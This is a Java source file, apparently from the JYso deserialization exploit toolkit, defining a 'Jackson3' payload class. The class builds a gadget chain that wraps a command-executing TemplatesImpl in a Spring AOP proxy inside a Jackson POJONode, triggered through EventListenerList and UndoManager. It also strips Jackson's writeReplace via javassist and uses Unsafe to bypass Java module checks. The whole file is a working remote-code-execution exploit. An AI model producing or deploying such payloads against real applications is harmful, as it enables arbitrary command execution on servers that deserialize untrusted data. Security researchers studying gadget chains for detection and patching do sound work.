package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.utils.SuClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.qi4l.JYso.gadgets.utils.Gadgets;

import javassist.ClassClassPath;
import sun.misc.Unsafe;

import org.springframework.aop.framework.AdvisedSupport;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import weblogic.apache.xpath.objects.XObject;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.*;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.Vector;

import static com.qi4l.JYso.gadgets.Config.Config.POOL;
import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;


public class Jackson3 implements ObjectPayload<Object> {
    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object            proxy   = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        return proxy;
    }

    public static Object getEventListenerList(Object obj) throws Exception {
        //EventListenerList list = new EventListenerList();
        POOL.insertClassPath(new ClassClassPath(Class.forName("javax.swing.event.EventListenerList")));
        final CtClass ctEventListenerList = POOL.get("javax.swing.event.EventListenerList");
        insertField(ctEventListenerList, "serialVersionUID", "private static final long serialVersionUID = -7977902244297240866L;");
        Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();

        //UndoManager undomanager = new UndoManager();
        POOL.insertClassPath(new ClassClassPath(Class.forName("javax.swing.undo.UndoManager")));
        final CtClass ctUndoManager = POOL.get("javax.swing.undo.UndoManager");
        insertField(ctUndoManager, "serialVersionUID", "private static final long serialVersionUID = -1045223116463488483L;");
        Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    private static Method getMethod(Class clazz, String methodName, Class[] params) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, params);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private static Unsafe getUnsafe() {
        Unsafe unsafe = null;
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        return unsafe;
    }

    public void bypassModule(ArrayList<Class> classes) {
        try {
            Unsafe unsafe       = getUnsafe();
            Class  currentClass = this.getClass();
            try {
                Method getModuleMethod = getMethod(Class.class, "getModule", new Class[0]);
                if (getModuleMethod != null) {
                    for (Class aClass : classes) {
                        Object targetModule = getModuleMethod.invoke(aClass, new Object[]{});
                        unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
                    }
                }
            } catch (Exception e) {
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c     = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }

    @Override
    public Object getObject(final String command) throws Exception {
        try {
            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception EE) {

        }

        ArrayList<Class> classes = new ArrayList<>();
        classes.add(TemplatesImpl.class);
        classes.add(POJONode.class);
        classes.add(EventListenerList.class);
        classes.add(Jackson3.class);
        classes.add(Field.class);
        classes.add(Method.class);
        new Jackson3().bypassModule(classes);

        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));

        Object eventListenerList = getEventListenerList(node);

        return eventListenerList;
    }


}
